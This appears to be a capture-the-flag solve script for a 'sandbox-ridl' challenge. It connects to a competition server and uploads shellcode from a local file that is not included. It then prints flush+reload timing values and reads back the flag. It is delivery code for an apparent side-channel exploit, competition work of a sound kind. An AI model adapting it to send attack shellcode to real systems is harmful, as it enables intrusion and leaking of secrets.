#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Authors: @oranav, @yuvalof
import socket
import struct
import sys


def recvuntil(s, delim=b'\n'):
    buf = b''
    while not buf.endswith(delim):
        buf += s.recv(1)
    return buf


def readint(s):
    buf = b''
    while len(buf) < 4:
        buf += s.recv(1)
    return struct.unpack('<I', buf)[0]


s = socket.socket()
s.connect(("sandbox-ridl.ctfcompetition.com", 1337))
recvuntil(s, b'sc\n')

sc = open('solve.bin', 'rb').read()
s.send(struct.pack('<I', len(sc)))
s.send(sc)

print('Reload time      ', readint(s))
print('Flush+reload time', readint(s))
print('Threshold        ', readint(s))

# Read the flag
for i in range(24):
    ch = s.recv(1)
    sys.stdout.buffer.write(ch)
    sys.stdout.flush()
